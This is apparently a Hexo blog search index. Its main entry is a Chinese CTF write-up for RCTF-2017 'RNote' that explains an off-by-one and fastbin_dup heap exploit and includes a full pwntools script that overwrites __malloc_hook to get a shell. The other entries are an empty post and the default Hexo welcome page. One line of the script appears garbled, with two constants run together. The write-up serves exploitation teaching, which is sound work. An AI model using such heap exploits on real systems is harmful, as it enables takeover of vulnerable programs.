<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RNote</title>
      <link href="/2019/05/23/Write-up_cn/"/>
      <url>/2019/05/23/Write-up_cn/</url>
      
        <content type="html"><![CDATA[<h1 id="RCTF-2017-RNote"><a href="#RCTF-2017-RNote" class="headerlink" title="RCTF-2017: RNote"></a><center>RCTF-2017: RNote</center></h1><h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a><strong>【原理】</strong></h2><p>off-by-one, fastbin_dup</p><h2 id="【目的】"><a href="#【目的】" class="headerlink" title="【目的】"></a><strong>【目的】</strong></h2><p>了解基础堆知识，懂得堆溢出漏洞的利用</p><h2 id="【环境】"><a href="#【环境】" class="headerlink" title="【环境】"></a><strong>【环境】</strong></h2><p>Linux</p><h2 id="【工具】"><a href="#【工具】" class="headerlink" title="【工具】"></a><strong>【工具】</strong></h2><p>gdb(装有peda)，IDA，python，pwntools</p><h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a><strong>【步骤】</strong></h2><p>首先查看代码逻辑:<br><img src="http://yanxuan.nosdn.127.net/a38b3ed52ee9f0fe298b7e38eb135e4f.png" alt><br>进入add_onte查看:<br><img src="http://yanxuan.nosdn.127.net/9a643f5e21e5365e485f416d12f393eb.png" alt><br>通过观察能够知道，这个note应该是一个结构体，然后有一个数组notes[15]专门存放数据</p><pre class=" language-C"><code class="language-C">struct note {    int IsUsed; :4    int size;   :4    char title[0x10]; :16    char *content; :8};</code></pre><p>接下来，我们发现在下方的read处读取数据，然而我们知道，read是不会给字符串的结尾增加数据的，所以我们可以通过这个地方实现堆上敏感数据的泄露。<br>首先我们了解一下堆，堆在申请fastbin大小的数据的时候，在free之后不会被回收，而是等待下一次分配，所以我们可以如此构造堆结构:<br><img src="http://yanxuan.nosdn.127.net/0eb877029303b3c561cf34ce6870f636.png" alt><br>上述情况可以通过【申请1】 –&gt; 【申请2】 –&gt; 【释放2】 –&gt; 【释放1】 来触发。接下来，我们如果再次申请一个空间，那么此时便便会得到1的位置的数据，此时1中数据段开始的位置中，【记录了堆的位置】，那么我们就能通过这个位置的数据泄露出堆的位置。<br>接下来我们可以泄露libc的地址。通过申请一个small bin，然后将其删除的话，那么此时就会形成一个双向指针，这个指针指向的是main_arena的位置，所以我们能够利用这一点，找到实际上libc的起始位置.<br><img src="http://yanxuan.nosdn.127.net/83479206410c7d28d486a6b0fbbe82c7.png" alt><br>然后我们能够从libc中找到一个可以getshell的必要函数的位置:<br><img src="http://yanxuan.nosdn.127.net/270729188f72ef3fa984557cc2261d60.png" alt></p><p>信息泄露就做的差不多了，之后我们要开始劫持程序流：</p><p>我们在add_note处能发现一个漏洞:<br><img src="http://yanxuan.nosdn.127.net/410af6ae9899ef2a295d78fb5429a4ec.png" alt><br>这里会读入一个字符，读入的字符会覆盖掉堆地址的最后一位，从而使堆的指针位置发生错位。<br><img src="http://yanxuan.nosdn.127.net/4e3987f188cd629d5c2de5e5e2f02719.png" alt><br>原先的指针指向的位置<br><img src="http://yanxuan.nosdn.127.net/b5acd243a9c2340a18196a624caaee35.png" alt><br>此后发生的偏移。</p><p>我们可以利用这一点，让两个堆的地址<strong>指向同一个位置</strong>，这样的话，当我们首先申请三个块，再依次释放的话，会发生如下的事情:<br>首先我们有三个块。我们通过上述漏洞，构造如下形式。由于第三个块丢失了指针，这里暂时不画出来<br><img src="http://yanxuan.nosdn.127.net/e8893ce76ba26a38747a2f1537b892a7.png" alt><br>然后我们此时删除第一个块,此时指针之间没有变化。<br>然后我们删除第二个块，此时指针变化如下:<br><img src="http://yanxuan.nosdn.127.net/672998c033174154cf5cb8a7d0f26847.png" alt><br>这里可以看到，这个块指向了上一个块的起始位置。<br>然后当我们删除第三个块的时候，变化如下:<br><img src="http://yanxuan.nosdn.127.net/eb1a6a54cb42b6bc451df7823594e141.png" alt><br>由于此时fastbin认为当前块未释放，于是直接将当前的fastbin的指针指向了上一个空闲块的位置上。<br><img src="http://yanxuan.nosdn.127.net/7a77feb8c20a3b8fe62c8ef013d2e637.png" alt><br>于是此时我们此时可以利用这个fastbin_dup攻击的方式，通过修改链表尾端指向的地址，让我们得到_malloc_hook的地址.<br>此后第一次malloc，我们获得如下块:<br><img src="http://yanxuan.nosdn.127.net/000e3a57eef744416097dfb3c81fd42f.png" alt><br><img src="http://yanxuan.nosdn.127.net/d3ccc577e6bb156c3088e3ef6fa06e4c.png" alt><br>此时我们在fd的位置修改成如下地址，第二次分配后变成如下：<br><img src="http://yanxuan.nosdn.127.net/5890e98eaa8a91bba914693be1ba315a.png" alt><br>第三次分配后，我们就能够让fastbin指向fd的指针指向<strong>malloc_hook的位置:<br><img src="http://yanxuan.nosdn.127.net/771f6100136840b4a85104c82a77d3ce.png" alt><br>再下一次malloc我们就能够得到</strong>malloc_hook的指针，在我们第四次得到数据后，我们只需要往里面写入我们之前准备好的攻击数据即可。</p><p>代码如下:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>s <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./RNote'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> title<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>size<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>title<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>index<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'200'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'200'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'200'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'note content: A'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">104</span><span class="token operator">-</span><span class="token number">0x3c1740</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3C1740</span><span class="token number">0x3fd4f</span>oneshot <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xE8FE1</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"LIBC BASE : "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"MALLOC HOOK : "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span><span class="token string">'\x10'</span> <span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x1b</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x1b</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'96'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>oneshot<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input the note size:'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'GOT SHELL!'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a><strong>【总结】</strong></h2><p>堆的错误比较隐晦，而且利用起来也有一定的难度，需要对glibc中malloc的代码有一定的了解程度。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sxj</title>
      <link href="/2019/05/20/sxj/"/>
      <url>/2019/05/20/sxj/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/05/19/hello-world/"/>
      <url>/2019/05/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
